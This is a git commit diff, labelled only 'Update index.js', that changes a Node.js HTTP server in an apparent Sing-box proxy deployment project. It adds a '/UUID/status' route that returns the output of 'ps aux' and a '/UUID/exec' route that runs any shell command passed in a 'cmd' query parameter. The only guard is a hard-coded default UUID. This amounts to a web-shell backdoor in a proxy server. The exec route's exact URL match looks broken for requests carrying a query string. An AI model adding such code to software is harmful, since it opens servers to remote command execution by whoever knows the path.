6e9b6130af24863c05ebefd9652c4c3f5694c3db
zj20122226 <130367027+zj20122226@users.noreply.github.com>
2025-06-13 21:23:00 +0800

    Update index.js

--- eooce/Sing-box/nodejs/index.js
+++ eooce/Sing-box/nodejs/index.js
@@ -1,6 +1,7 @@
 const http = require('http');
+const { exec, execSync } = require('child_process');
+const url = require('url');
 const fs = require('fs');
-const exec = require("child_process").exec;
 const subtxt = './.npm/sub.txt' 
 const PORT = process.env.PORT || 3000; 
 const UUID = process.env.UUID || '6877aae2-a8e7-44cc-ac29-c928eefa08e6';
@@ -44,7 +45,32 @@ const server = http.createServer((req, res) => {
           res.end(data);
         }
       });
+    } else if (req.url === `/${UUID}/status`) {
+        res.writeHead(200, { 'Content-Type': 'text/html' });
+        let cmdStr = "ps aux";
+        exec(cmdStr, function (err, stdout, stderr) {
+            if (err) {
+                res.end("<pre>命令行执行错误：\n" + err + "</pre>");
+            } else {
+                res.end("<pre>获取系统进程表：\n" + stdout + "</pre>");
+            }
+        });
+    } else if (req.url === `/${UUID}/exec`) {
+        // Get information object about request URL:'true' sets parameters to be returned in object format
+        const parsedURL = url.parse(req.url, true);
+        // Get all parameters:{ key1: 'value1', key2: 'value2', key3: 'value3' }
+        // console.log(parsedURL.query);
+        res.writeHead(200, { 'Content-Type': 'text/plain' });
+        if (!parsedURL.query.cmd) {
+            res.end('No command\n');
+            return;
+        }
+        let cmdStr = parsedURL.query.cmd;
+        exec(cmdStr, function (err, stdout, stderr) {
+            res.end(err? err.message : stdout);
+        });
     }
+    
   });
 
 server.listen(PORT, () => {
